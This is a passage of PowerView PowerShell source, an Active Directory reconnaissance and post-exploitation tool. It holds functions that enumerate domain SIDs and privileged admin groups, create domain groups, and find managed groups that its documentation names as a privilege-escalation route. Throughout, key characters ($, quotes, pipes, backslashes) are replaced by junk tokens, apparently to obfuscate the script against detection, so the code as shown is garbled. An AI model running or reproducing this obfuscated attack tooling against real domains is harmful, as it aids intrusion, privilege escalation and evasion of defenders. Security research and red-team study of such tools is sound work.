            if (RaUPSBoundParameters[q4gUFindOneq4gU]) { RaUResults = RaUSubnetSearcher.FindOne() }
            else { RaUResults = RaUSubnetSearcher.FindAll() }
            RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                if (RaUPSBoundParameters[q4gURawq4gU]) {
                    # return raw result objects
                    RaUSubnet = RaU_
                }
                else {
                    RaUSubnet = Convert-LDAPProperty -Properties RaU_.Properties
                }
                RaUSubnet.PSObject.TypeNames.Insert(0, q4gUPowerView.Subnetq4gU)

                if (RaUPSBoundParameters[q4gUSiteNameq4gU]) {
                    # have to do the filtering after the LDAP query as LDAP doesnq4gUt let you specify
                    #   wildcards for q4gUsiteobjectq4gU :(
                    if (RaUSubnet.properties -and (RaUSubnet.properties.siteobject -like Oj8X*RaUSiteName*Oj8X)) {
                        RaUSubnet
                    }
                    elseif (RaUSubnet.siteobject -like Oj8X*RaUSiteName*Oj8X) {
                        RaUSubnet
                    }
                }
                else {
                    RaUSubnet
                }
            }
            if (RaUResults) {
                try { RaUResults.dispose() }
                catch {
                    Write-Verbose Oj8X[Get-DomainSubnet] Error disposing of the Results object: RaU_Oj8X
                }
            }
            RaUSubnetSearcher.dispose()
        }
    }
}


function Get-DomainSID {
<#
.SYNOPSIS

Returns the SID for the current domain or the specified domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer  

.DESCRIPTION

Returns the SID for the current domain or the specified domain by executing
Get-DomainComputer with the -LDAPFilter set to (userAccountControl:1.2.840.113556.1.4.803:=8192)
to search for domain controllers through LDAP. The SID of the returned domain controller
is then extracted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainSID

.EXAMPLE

Get-DomainSID -Domain testlab.local

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainSID -Credential RaUCred

.OUTPUTS

String

A string representing the specified domain SID.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    RaUSearcherArguments = @{
        q4gULDAPFilterq4gU = q4gU(userAccountControl:1.2.840.113556.1.4.803:=8192)q4gU
    }
    if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
    if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
    if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

    RaUDCSID = Get-DomainComputer @SearcherArguments -FindOne wZ5t Select-Object -First 1 -ExpandProperty objectsid

    if (RaUDCSID) {
        RaUDCSID.SubString(0, RaUDCSID.LastIndexOf(q4gU-q4gU))
    }
    else {
        Write-Verbose Oj8X[Get-DomainSID] Error extracting domain SID for q4gURaUDomainq4gUOj8X
    }
}


function Get-DomainGroup {
<#
.SYNOPSIS

Return all groups or specific group objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainObject, Convert-ADName, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
Oj8X-Properties samaccountname,usnchanged,...Oj8X. By default, all group objects for
the current domain are returned. To return the groups a specific user/group is
a part of, use -MemberIdentity X to execute token groups enumeration.

.PARAMETER Identity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to query for. Wildcards accepted.

.PARAMETER MemberIdentity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the user/group member to query for group membership.

.PARAMETER AdminCount

Switch. Return users with q4gU(adminCount=1)q4gU (meaning are/were privileged).

.PARAMETER GroupScope

Specifies the scope (DomainLocal, Global, or Universal) of the group(s) to search for.
Also accepts NotDomainLocal, NotGloba, and NotUniversal as negations.

.PARAMETER GroupProperty

Specifies a specific property to search for when performing the group search.
Possible values are Security, Distribution, CreatedBySystem, and NotCreatedBySystem.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainGroup wZ5t select samaccountname

samaccountname
--------------
WinRMRemoteWMIUsers__
Administrators
Users
Guests
Print Operators
Backup Operators
...

.EXAMPLE

Get-DomainGroup *admin* wZ5t select distinguishedname

distinguishedname
-----------------
CN=Administrators,CN=Builtin,DC=testlab,DC=local
CN=Hyper-V Administrators,CN=Builtin,DC=testlab,DC=local
CN=Schema Admins,CN=Users,DC=testlab,DC=local
CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
CN=Domain Admins,CN=Users,DC=testlab,DC=local
CN=DnsAdmins,CN=Users,DC=testlab,DC=local
CN=Server Admins,CN=Users,DC=testlab,DC=local
CN=Desktop Admins,CN=Users,DC=testlab,DC=local

.EXAMPLE

Get-DomainGroup -Properties samaccountname -Identity q4gUS-1-5-21-890171859-3433809279-3366196753-1117q4gU wZ5t fl

samaccountname
--------------
Server Admins

.EXAMPLE

q4gUCN=Desktop Admins,CN=Users,DC=testlab,DC=localq4gU wZ5t Get-DomainGroup -Server primary.testlab.local -Verbose
VERBOSE: Get-DomainSearcher search string: LDAP://DC=testlab,DC=local
VERBOSE: Get-DomainGroup filter string: (&(objectCategory=group)(wZ5t(distinguishedname=CN=DesktopAdmins,CN=Users,DC=testlab,DC=local)))

usncreated            : 13245
grouptype             : -2147483646
samaccounttype        : 268435456
samaccountname        : Desktop Admins
whenchanged           : 8/10/2016 12:30:30 AM
objectsid             : S-1-5-21-890171859-3433809279-3366196753-1118
objectclass           : {top, group}
cn                    : Desktop Admins
usnchanged            : 13255
dscorepropagationdata : 1/1/1601 12:00:00 AM
name                  : Desktop Admins
distinguishedname     : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
member                : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
whencreated           : 8/10/2016 12:29:43 AM
instancetype          : 4
objectguid            : f37903ed-b333-49f4-abaa-46c65e9cca71
objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=testlab,DC=local

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainGroup -Credential RaUCred

.EXAMPLE

Get-Domain wZ5t Select-Object -Expand name
testlab.local

q4gUDEVScKjDomain Adminsq4gU wZ5t Get-DomainGroup -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainGroup] Extracted domain q4gUdev.testlab.localq4gU from q4gUDEVScKjDomain Adminsq4gU
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainGroup] filter string: (&(objectCategory=group)(wZ5t(samAccountName=Domain Admins)))

distinguishedname
-----------------
CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local

.OUTPUTS

PowerView.Group

Custom PSObject with translated group property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseDeclaredVarsMoreThanAssignmentsq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.Groupq4gU)]
    [CmdletBinding(DefaultParameterSetName = q4gUAllowDelegationq4gU)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU, q4gUMemberDistinguishedNameq4gU, q4gUMemberNameq4gU)]
        [String[]]
        RaUIdentity,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUUserNameq4gU)]
        [String]
        RaUMemberIdentity,

        [Switch]
        RaUAdminCount,

        [ValidateSet(q4gUDomainLocalq4gU, q4gUNotDomainLocalq4gU, q4gUGlobalq4gU, q4gUNotGlobalq4gU, q4gUUniversalq4gU, q4gUNotUniversalq4gU)]
        [Alias(q4gUScopeq4gU)]
        [String]
        RaUGroupScope,

        [ValidateSet(q4gUSecurityq4gU, q4gUDistributionq4gU, q4gUCreatedBySystemq4gU, q4gUNotCreatedBySystemq4gU)]
        [String]
        RaUGroupProperty,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [ValidateSet(q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU)]
        [String]
        RaUSecurityMasks,

        [Switch]
        RaUTombstone,

        [Alias(q4gUReturnOneq4gU)]
        [Switch]
        RaUFindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        RaURaw
    )

    BEGIN {
        RaUSearcherArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUPropertiesq4gU]) { RaUSearcherArguments[q4gUPropertiesq4gU] = RaUProperties }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUSecurityMasksq4gU]) { RaUSearcherArguments[q4gUSecurityMasksq4gU] = RaUSecurityMasks }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
        RaUGroupSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if (RaUGroupSearcher) {
            if (RaUPSBoundParameters[q4gUMemberIdentityq4gU]) {

                if (RaUSearcherArguments[q4gUPropertiesq4gU]) {
                    RaUOldProperties = RaUSearcherArguments[q4gUPropertiesq4gU]
                }

                RaUSearcherArguments[q4gUIdentityq4gU] = RaUMemberIdentity
                RaUSearcherArguments[q4gURawq4gU] = RaUTrue

                Get-DomainObject @SearcherArguments wZ5t ForEach-Object {
                    # convert the user/group to a directory entry
                    RaUObjectDirectoryEntry = RaU_.GetDirectoryEntry()

                    # cause the cache to calculate the token groups for the user/group
                    RaUObjectDirectoryEntry.RefreshCache(q4gUtokenGroupsq4gU)

                    RaUObjectDirectoryEntry.TokenGroups wZ5t ForEach-Object {
                        # convert the token group sid
                        RaUGroupSid = (New-Object System.Security.Principal.SecurityIdentifier(RaU_,0)).Value

                        # ignore the built in groups
                        if (RaUGroupSid -notmatch q4gU^S-1-5-32-.*q4gU) {
                            RaUSearcherArguments[q4gUIdentityq4gU] = RaUGroupSid
                            RaUSearcherArguments[q4gURawq4gU] = RaUFalse
                            if (RaUOldProperties) { RaUSearcherArguments[q4gUPropertiesq4gU] = RaUOldProperties }
                            RaUGroup = Get-DomainObject @SearcherArguments
                            if (RaUGroup) {
                                RaUGroup.PSObject.TypeNames.Insert(0, q4gUPowerView.Groupq4gU)
                                RaUGroup
                            }
                        }
                    }
                }
            }
            else {
                RaUIdentityFilter = q4gUq4gU
                RaUFilter = q4gUq4gU
                RaUIdentity wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                    RaUIdentityInstance = RaU_.Replace(q4gU(q4gU, q4gUScKj28q4gU).Replace(q4gU)q4gU, q4gUScKj29q4gU)
                    if (RaUIdentityInstance -match q4gU^S-1-q4gU) {
                        RaUIdentityFilter += Oj8X(objectsid=RaUIdentityInstance)Oj8X
                    }
                    elseif (RaUIdentityInstance -match q4gU^CN=q4gU) {
                        RaUIdentityFilter += Oj8X(distinguishedname=RaUIdentityInstance)Oj8X
                        if ((-not RaUPSBoundParameters[q4gUDomainq4gU]) -and (-not RaUPSBoundParameters[q4gUSearchBaseq4gU])) {
                            # if a -Domain isnq4gUt explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            RaUIdentityDomain = RaUIdentityInstance.SubString(RaUIdentityInstance.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                            Write-Verbose Oj8X[Get-DomainGroup] Extracted domain q4gURaUIdentityDomainq4gU from q4gURaUIdentityInstanceq4gUOj8X
                            RaUSearcherArguments[q4gUDomainq4gU] = RaUIdentityDomain
                            RaUGroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not RaUGroupSearcher) {
                                Write-Warning Oj8X[Get-DomainGroup] Unable to retrieve domain searcher for q4gURaUIdentityDomainq4gUOj8X
                            }
                        }
                    }
                    elseif (RaUIdentityInstance -imatch q4gU^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}RaUq4gU) {
                        RaUGuidByteString = (([Guid]RaUIdentityInstance).ToByteArray() wZ5t ForEach-Object { q4gUScKjq4gU + RaU_.ToString(q4gUX2q4gU) }) -join q4gUq4gU
                        RaUIdentityFilter += Oj8X(objectguid=RaUGuidByteString)Oj8X
                    }
                    elseif (RaUIdentityInstance.Contains(q4gUScKjq4gU)) {
                        RaUConvertedIdentityInstance = RaUIdentityInstance.Replace(q4gUScKj28q4gU, q4gU(q4gU).Replace(q4gUScKj29q4gU, q4gU)q4gU) wZ5t Convert-ADName -OutputType Canonical
                        if (RaUConvertedIdentityInstance) {
                            RaUGroupDomain = RaUConvertedIdentityInstance.SubString(0, RaUConvertedIdentityInstance.IndexOf(q4gU/q4gU))
                            RaUGroupName = RaUIdentityInstance.Split(q4gUScKjq4gU)[1]
                            RaUIdentityFilter += Oj8X(samAccountName=RaUGroupName)Oj8X
                            RaUSearcherArguments[q4gUDomainq4gU] = RaUGroupDomain
                            Write-Verbose Oj8X[Get-DomainGroup] Extracted domain q4gURaUGroupDomainq4gU from q4gURaUIdentityInstanceq4gUOj8X
                            RaUGroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        RaUIdentityFilter += Oj8X(wZ5t(samAccountName=RaUIdentityInstance)(name=RaUIdentityInstance))Oj8X
                    }
                }

                if (RaUIdentityFilter -and (RaUIdentityFilter.Trim() -ne q4gUq4gU) ) {
                    RaUFilter += Oj8X(wZ5tRaUIdentityFilter)Oj8X
                }

                if (RaUPSBoundParameters[q4gUAdminCountq4gU]) {
                    Write-Verbose q4gU[Get-DomainGroup] Searching for adminCount=1q4gU
                    RaUFilter += q4gU(admincount=1)q4gU
                }
                if (RaUPSBoundParameters[q4gUGroupScopeq4gU]) {
                    RaUGroupScopeValue = RaUPSBoundParameters[q4gUGroupScopeq4gU]
                    RaUFilter = Switch (RaUGroupScopeValue) {
                        q4gUDomainLocalq4gU       { q4gU(groupType:1.2.840.113556.1.4.803:=4)q4gU }
                        q4gUNotDomainLocalq4gU    { q4gU(!(groupType:1.2.840.113556.1.4.803:=4))q4gU }
                        q4gUGlobalq4gU            { q4gU(groupType:1.2.840.113556.1.4.803:=2)q4gU }
                        q4gUNotGlobalq4gU         { q4gU(!(groupType:1.2.840.113556.1.4.803:=2))q4gU }
                        q4gUUniversalq4gU         { q4gU(groupType:1.2.840.113556.1.4.803:=8)q4gU }
                        q4gUNotUniversalq4gU      { q4gU(!(groupType:1.2.840.113556.1.4.803:=8))q4gU }
                    }
                    Write-Verbose Oj8X[Get-DomainGroup] Searching for group scope q4gURaUGroupScopeValueq4gUOj8X
                }
                if (RaUPSBoundParameters[q4gUGroupPropertyq4gU]) {
                    RaUGroupPropertyValue = RaUPSBoundParameters[q4gUGroupPropertyq4gU]
                    RaUFilter = Switch (RaUGroupPropertyValue) {
                        q4gUSecurityq4gU              { q4gU(groupType:1.2.840.113556.1.4.803:=2147483648)q4gU }
                        q4gUDistributionq4gU          { q4gU(!(groupType:1.2.840.113556.1.4.803:=2147483648))q4gU }
                        q4gUCreatedBySystemq4gU       { q4gU(groupType:1.2.840.113556.1.4.803:=1)q4gU }
                        q4gUNotCreatedBySystemq4gU    { q4gU(!(groupType:1.2.840.113556.1.4.803:=1))q4gU }
                    }
                    Write-Verbose Oj8X[Get-DomainGroup] Searching for group property q4gURaUGroupPropertyValueq4gUOj8X
                }
                if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) {
                    Write-Verbose Oj8X[Get-DomainGroup] Using additional LDAP filter: RaULDAPFilterOj8X
                    RaUFilter += Oj8XRaULDAPFilterOj8X
                }

                RaUGroupSearcher.filter = Oj8X(&(objectCategory=group)RaUFilter)Oj8X
                Write-Verbose Oj8X[Get-DomainGroup] filter string: RaU(RaUGroupSearcher.filter)Oj8X

                if (RaUPSBoundParameters[q4gUFindOneq4gU]) { RaUResults = RaUGroupSearcher.FindOne() }
                else { RaUResults = RaUGroupSearcher.FindAll() }
                RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                    if (RaUPSBoundParameters[q4gURawq4gU]) {
                        # return raw result objects
                        RaUGroup = RaU_
                    }
                    else {
                        RaUGroup = Convert-LDAPProperty -Properties RaU_.Properties
                    }
                    RaUGroup.PSObject.TypeNames.Insert(0, q4gUPowerView.Groupq4gU)
                    RaUGroup
                }
                if (RaUResults) {
                    try { RaUResults.dispose() }
                    catch {
                        Write-Verbose Oj8X[Get-DomainGroup] Error disposing of the Results objectOj8X
                    }
                }
                RaUGroupSearcher.dispose()
            }
        }
    }
}


function New-DomainGroup {
<#
.SYNOPSIS

Creates a new domain group (assuming appropriate permissions) and returns the group object.

TODO: implement all properties that New-ADGroup implements (https://technet.microsoft.com/en-us/library/ee617253.aspx).

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to create a new
DirectoryServices.AccountManagement.GroupPrincipal with the specified
group properties.

.PARAMETER SamAccountName

Specifies the Security Account Manager (SAM) account name of the group to create.
Maximum of 256 characters. Mandatory.

.PARAMETER Name

Specifies the name of the group to create. If not provided, defaults to SamAccountName.

.PARAMETER DisplayName

Specifies the display name of the group to create. If not provided, defaults to SamAccountName.

.PARAMETER Description

Specifies the description of the group to create.

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

New-DomainGroup -SamAccountName TestGroup -Description q4gUThis is a test group.q4gU

Creates the q4gUTestGroupq4gU group with the specified description.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
New-DomainGroup -SamAccountName TestGroup -Description q4gUThis is a test group.q4gU -Credential RaUCred

Creates the q4gUTestGroupq4gU group with the specified description using the specified alternate credentials.

.OUTPUTS

DirectoryServices.AccountManagement.GroupPrincipal
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseShouldProcessForStateChangingFunctionsq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUDirectoryServices.AccountManagement.GroupPrincipalq4gU)]
    Param(
        [Parameter(Mandatory = RaUTrue)]
        [ValidateLength(0, 256)]
        [String]
        RaUSamAccountName,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUName,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDescription,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    RaUContextArguments = @{
        q4gUIdentityq4gU = RaUSamAccountName
    }
    if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUContextArguments[q4gUDomainq4gU] = RaUDomain }
    if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUContextArguments[q4gUCredentialq4gU] = RaUCredential }
    RaUContext = Get-PrincipalContext @ContextArguments

    if (RaUContext) {
        RaUGroup = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList (RaUContext.Context)

        # set all the appropriate group parameters
        RaUGroup.SamAccountName = RaUContext.Identity

        if (RaUPSBoundParameters[q4gUNameq4gU]) {
            RaUGroup.Name = RaUName
        }
        else {
            RaUGroup.Name = RaUContext.Identity
        }
        if (RaUPSBoundParameters[q4gUDisplayNameq4gU]) {
            RaUGroup.DisplayName = RaUDisplayName
        }
        else {
            RaUGroup.DisplayName = RaUContext.Identity
        }

        if (RaUPSBoundParameters[q4gUDescriptionq4gU]) {
            RaUGroup.Description = RaUDescription
        }

        Write-Verbose Oj8X[New-DomainGroup] Attempting to create group q4gURaUSamAccountNameq4gUOj8X
        try {
            RaUNull = RaUGroup.Save()
            Write-Verbose Oj8X[New-DomainGroup] Group q4gURaUSamAccountNameq4gU successfully createdOj8X
            RaUGroup
        }
        catch {
            Write-Warning Oj8X[New-DomainGroup] Error creating group q4gURaUSamAccountNameq4gU : RaU_Oj8X
        }
    }
}


function Get-DomainManagedSecurityGroup {
<#
.SYNOPSIS

Returns all security groups in the current (or target) domain that have a manager set.

Author: Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>, Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject, Get-DomainGroup, Get-DomainObjectAcl  

.DESCRIPTION

Authority to manipulate the group membership of AD security groups and distribution groups
can be delegated to non-administrators by setting the q4gUmanagedByq4gU attribute. This is typically
used to delegate management authority to distribution groups, but Windows supports security groups
being managed in the same way.

This function searches for AD groups which have a group manager set, and determines whether that
user can manipulate group membership. This could be a useful method of horizontal privilege
escalation, especially if the manager can manipulate the membership of a privileged group.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainManagedSecurityGroup wZ5t Export-PowerViewCSV -NoTypeInformation group-managers.csv

Store a list of all security groups with managers in group-managers.csv

.OUTPUTS

PowerView.ManagedSecurityGroup

A custom PSObject describing the managed security group.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.ManagedSecurityGroupq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUNameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUSearcherArguments = @{
            q4gULDAPFilterq4gU = q4gU(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))q4gU
            q4gUPropertiesq4gU = q4gUdistinguishedName,managedBy,samaccounttype,samaccountnameq4gU
        }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUSecurityMasksq4gU]) { RaUSearcherArguments[q4gUSecurityMasksq4gU] = RaUSecurityMasks }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
    }

    PROCESS {
        if (RaUPSBoundParameters[q4gUDomainq4gU]) {
            RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain
            RaUTargetDomain = RaUDomain
        }
        else {
            RaUTargetDomain = RaUEnv:USERDNSDOMAIN
        }

        # go through the list of security groups on the domain and identify those who have a manager
        Get-DomainGroup @SearcherArguments wZ5t ForEach-Object {
            RaUSearcherArguments[q4gUPropertiesq4gU] = q4gUdistinguishedname,name,samaccounttype,samaccountname,objectsidq4gU
            RaUSearcherArguments[q4gUIdentityq4gU] = RaU_.managedBy
            RaUNull = RaUSearcherArguments.Remove(q4gULDAPFilterq4gU)

            # RaUSearcherArguments
            # retrieve the object that the managedBy DN refers to
            RaUGroupManager = Get-DomainObject @SearcherArguments
            # Write-Host Oj8XGroupManager: RaUGroupManagerOj8X
